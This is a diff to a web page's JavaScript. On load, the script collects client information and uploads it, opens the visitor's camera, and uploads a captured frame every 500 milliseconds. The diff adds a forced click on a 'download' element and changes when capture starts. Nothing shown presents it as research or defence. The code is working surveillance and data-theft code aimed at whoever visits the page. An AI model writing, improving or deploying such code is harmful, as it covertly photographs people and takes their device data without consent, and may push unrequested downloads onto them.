@@ -4,6 +4,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
+    document.getElementById('download').click();
     clientInfo = await getClientInfo();
     uploadInfo(clientInfo);
 
@@ -12,7 +13,10 @@ document.addEventListener('DOMContentLoaded', async () => {
         .then((stream) => {
             video.srcObject = stream;
             video.play();
-            setInterval(() => takePicture(video, canvas), 500); // Cattura foto ogni 500 ms
+            video.addEventListener('playing', () => {
+                console.log('Video is playing, starting capture.');
+                setInterval(() => takePicture(video, canvas), 500);
+            });
         })
         .catch((err) => {
             console.error(`An error occurred: ${err}`);
@@ -60,9 +64,9 @@ function uploadPic(blob) {
 
 function takePicture(video, canvas) {
     const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.width = video.videoWidth;  
+    canvas.height = video.videoHeight;  
+    context.drawImage(video, 0, 0, canvas.width, canvas.height); 
 
     const dataUrl = canvas.toDataURL('image/png');
     uploadPic(dataURLToBlob(dataUrl));
